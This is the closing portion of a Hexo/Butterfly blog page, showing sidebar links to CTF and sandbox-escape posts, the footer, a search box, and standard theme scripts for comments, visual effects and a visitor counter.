src="/img/feiji.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="预测urandom的输出"/></a><div class="content"><a class="title" href="/posts/81a94eee.html" title="预测urandom的输出">预测urandom的输出</a><time datetime="2023-05-14T23:36:47.683Z" title="发表于 2023-05-15 07:36:47">2023-05-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/ded1a676.html" title="通过创建的线程开启shell绕过沙箱"><img src="/img/29.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="通过创建的线程开启shell绕过沙箱"/></a><div class="content"><a class="title" href="/posts/ded1a676.html" title="通过创建的线程开启shell绕过沙箱">通过创建的线程开启shell绕过沙箱</a><time datetime="2023-05-14T23:36:47.680Z" title="发表于 2023-05-15 07:36:47">2023-05-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/9107d8ac.html" title="虎符CTF2022 babygame"><img src="/img/4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="虎符CTF2022 babygame"/></a><div class="content"><a class="title" href="/posts/9107d8ac.html" title="虎符CTF2022 babygame">虎符CTF2022 babygame</a><time datetime="2023-05-14T23:36:47.677Z" title="发表于 2023-05-15 07:36:47">2023-05-15</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/24.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By ZIKH26</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi，欢迎来<a href="https://zikh26.github.io/">我的博客</a>!!!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'GEgJnxmVMmtk5TO9ntcgogeL-gzGzoHsz',
+      appKey: 'FJXLkmbCYXC6IqkCRKgQzTJf',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: true
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script src="/js/sun_moon.js" async></script><link rel="stylesheet" href="/css/font.css"><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
